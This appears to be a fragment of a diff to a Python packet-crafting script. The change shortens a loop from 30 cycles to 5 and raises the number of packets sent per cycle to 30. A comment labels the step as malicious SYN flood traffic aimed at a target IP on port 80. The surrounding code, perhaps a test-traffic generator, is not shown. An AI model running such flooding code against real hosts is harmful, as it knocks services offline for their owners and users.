@@ -12,13 +12,13 @@ target_port = 80
 
 start_time = time.time()
 
-for cycle in range(30):
+for cycle in range(5):
     print(f"\n--- Cycle {cycle + 1} ---")
     
     start_time = time.time()
     
     # 1. SEND MALICIOUS TRAFFIC (SYN Flood)
-    for i in range(5):
+    for i in range(30):
         mal_packet = IP(dst=target_ip)/TCP(
             sport=random.randint(1024, 65535), 
             dport=target_port, 
